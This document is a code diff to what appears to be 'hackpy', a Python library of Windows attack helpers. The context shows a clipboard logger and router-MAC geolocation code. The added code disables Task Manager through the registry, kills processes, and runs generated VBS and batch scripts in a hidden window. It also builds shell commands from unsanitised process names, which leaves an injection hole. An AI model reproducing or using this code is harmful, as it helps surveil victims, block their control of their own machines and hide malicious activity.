@@ -164,15 +164,14 @@ def bssid_locate(bssid, statusbar = None, out_tempfile = 'bssid_locate.json'):
 # Get router BSSID
 def router():
 	try:
-		SMART_ROUTER_IP = socket_gethostbyname(socket_gethostname()).split('.')[:-1]
-		SMART_ROUTER_IP = '.'.join(SMART_ROUTER_IP) + '.1'
-		BSSID = getmac(SMART_ROUTER_IP)
+		SMART_ROUTER_IP = ('.'.join(socket_gethostbyname(socket_gethostname()).split('.')[:-1]) + '.1')
+		BSSID = getmac(ip=SMART_ROUTER_IP)
 	except:
 		return None
 	else:
 		return BSSID
 
-def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python37'):
+def install_python(version = '3.7.0', path = os_environ['SystemDrive'] + '\\python'):
 	#
 	# Install python to system
 	# Example: hackpy.install_python(version = '3.6.0', path = 'C:\\python37')
@@ -287,6 +286,56 @@ class clipboard:
 				with open(file, "a") as cliplogger_file:
 					cliplogger_file.write('[' + time_ctime() + '] - Text: ' + str(pyperclip_paste()) + '\n')
 				clipboard_data_old = str(pyperclip_paste())
+
+class taskmanager:
+	#
+	# hackpy.taskmanager.enable()
+	# hackpy.taskmanager.disable()
+	#
+	# hackpy.taskmanager.kill('process_name.exe')
+	# hackpy.taskmanager.start('process_name.exe')
+	# hackpy.taskmanager.find('process_name.exe') # return True/False
+	#
+	def enable():
+		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 0')
+
+	def disable():
+		command.system('@reg.exe ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1')
+
+	def kill(process):
+		command.system('@taskkill /F /IM ' + process + ' >NUL')
+
+	def start(process):
+		command.system('@start ' + process + ' >NUL')
+
+	def find(process):
+		vbs_script_path = install_path + '\\' + 'task_script_' + str(random_randint(1, 100000)) + '.vbs'
+		bat_script_path = install_path + '\\' + 'task_script_' + str(random_randint(1, 100000)) + '.bat'
+		vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
+		bat_script = ('''
+@echo off
+set process=''' + process + '''
+tasklist /FI "IMAGENAME eq %process%" 2>NUL | find /I /N "%process%">NUL
+IF "%ERRORLEVEL%"=="0" (
+  echo True > ''' + install_path + '''\\process_level.txt
+) ELSE (
+  echo False > ''' + install_path + '''\\process_level.txt
+)
+''')
+		with open(bat_script_path, "w") as bat_script_write:
+			bat_script_write.write(bat_script)
+		with open(vbs_script_path, "w") as vbs_script_write:
+			vbs_script_write.write(vbs_script)
+
+		os_startfile(vbs_script_path)
+		time_sleep(0.4)
+		with open(install_path + '\\process_level.txt', "r") as process_read:
+			data = process_read.readline()
+		if data.split()[0] == 'True':
+			return True
+		elif data.split()[0] == 'False':
+			return False
+
 
 if __name__ == '__main__':
 	print(10 * '\n' + logo)
